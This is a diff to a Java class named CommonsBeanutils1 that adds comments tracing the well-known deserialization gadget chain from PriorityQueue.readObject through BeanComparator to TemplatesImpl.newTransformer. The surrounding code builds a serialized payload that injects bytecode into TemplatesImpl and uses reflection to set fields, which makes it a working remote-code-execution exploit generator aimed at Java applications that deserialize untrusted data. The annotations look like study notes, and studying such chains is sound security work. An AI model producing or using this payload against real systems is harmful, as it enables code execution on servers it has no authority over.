@@ -19,6 +19,12 @@ public class CommonsBeanutils1 {
         field.set(obj, value);
     }
 
+    /**
+     * PriorityQueue.readObject()
+     *      BeanComparator#compare()
+     *          TemplatesImpl#getOutputProperties()
+     *          TemplatesImpl#newTransformer()
+     */
     public static void main(String[] args) throws Exception {
         TemplatesImpl obj = new TemplatesImpl();
         setFieldValue(obj, "_bytecodes", new byte[][]{
@@ -33,7 +39,10 @@ public class CommonsBeanutils1 {
         queue.add(1);
         queue.add(1);
 
+
+        // BeanComparator#compare(obj1,obj2) --> PropertyUtils#getProperty(obj1,"outputProperties")
         setFieldValue(comparator, "property", "outputProperties");
+        // PropertyUtils#getProperty(obj1,"outputProperties") --> templatesImpl#getOutputProperties() --> templatesImpl#newTransformer()
         setFieldValue(queue, "queue", new Object[]{obj, obj});
 
         ByteArrayOutputStream barr = new ByteArrayOutputStream();
